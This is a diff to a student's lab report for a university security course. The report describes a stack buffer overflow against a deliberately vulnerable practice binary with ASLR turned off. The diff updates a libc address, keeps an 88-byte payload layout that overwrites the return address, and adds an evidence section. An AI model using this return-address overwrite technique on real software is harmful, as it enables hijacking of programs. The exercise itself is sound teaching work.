@@ -129,13 +129,13 @@ gdb -batch -ex 'starti' -ex 'info proc mappings' ./vulnprog
 The `exit()` address in libc was found with:
 ```bash
 gdb -batch -ex 'break main' -ex 'run' -ex 'print (void*)exit' ./vulnprog
-# → 0x7ffff7dedba0
+# → 0x7ffff7c47ba0
 ```
 
 For Group 9:
 ```
 Secret function = 0x555555554000 + 0x1319 = 0x555555555319
-exit()          = 0x7ffff7dedba0
+exit()          = 0x7ffff7c47ba0
 ```
 
 Both addresses are free of bytes `0x0a` and `0x21`.
@@ -152,7 +152,7 @@ Offset  Size  Content
  0      64    'A' × 64      fills the 64-byte fgets buffer
 64       8    'B' × 8       overwrites saved rbp (value irrelevant)
 72       8    0x555555555319 overwrites return address → Group 9 secret function
-80       8    0x7ffff7dedba0 overwrites [rbp+0x10] → exit()
+80       8    0x7ffff7c47ba0 overwrites [rbp+0x10] → exit()
 ```
 
 Total: 88 bytes, well within fgets' 127-byte limit.
@@ -229,3 +229,31 @@ Exit status: 0 (clean exit, no crash, no signal).
 | `run_exploit.sh` | Convenience wrapper to run the exploit for any group number |
 | `find_base.py` | Helper to verify the PIE base address via GDB |
 | `report.md` | This report |
+| `cmput333_group9_bof.txt` | Full terminal session captured with the `script` command |
+| `screenshot_1_pie_base.png` | GDB `info proc mappings` confirming PIE base `0x555555554000` |
+| `screenshot_2_exit_addr.png` | GDB `print (void*)exit` confirming `exit() = 0x7ffff7c47ba0` |
+| `screenshot_3_exploit_run.png` | Exploit run showing `SECRET CMPUT 333 Group 09 reached` |
+
+---
+
+## 8. Evidence
+
+### Terminal Session
+
+The file `cmput333_group9_bof.txt` contains the full terminal session recorded with the `script` command inside the `bof-vuln` Multipass VM. It covers:
+- ASLR confirmation (`cat /proc/sys/kernel/randomize_va_space` → `0`)
+- Binary inspection (`file ./vulnprog`)
+- PIE base verification via GDB (`info proc mappings`)
+- `exit()` address confirmation via GDB (`print (void*)exit`)
+- All 23 secret function addresses printed by `find_base.py`
+- The exploit run with the expected output
+
+### Screenshots
+
+All screenshots are watermarked with date/time and Group 9.
+
+**screenshot_1_pie_base.png** — GDB `info proc mappings` output confirming the binary loads at `0x555555554000` with ASLR disabled.
+
+**screenshot_2_exit_addr.png** — GDB `print (void*)exit` output confirming `exit()` is at `0x7ffff7c47ba0` in libc on Ubuntu 24.04.
+
+**screenshot_3_exploit_run.png** — The exploit being run with `python3 exploit.py | ./vulnprog`, showing the program output including `SECRET CMPUT 333 Group 09 reached` and a clean exit.
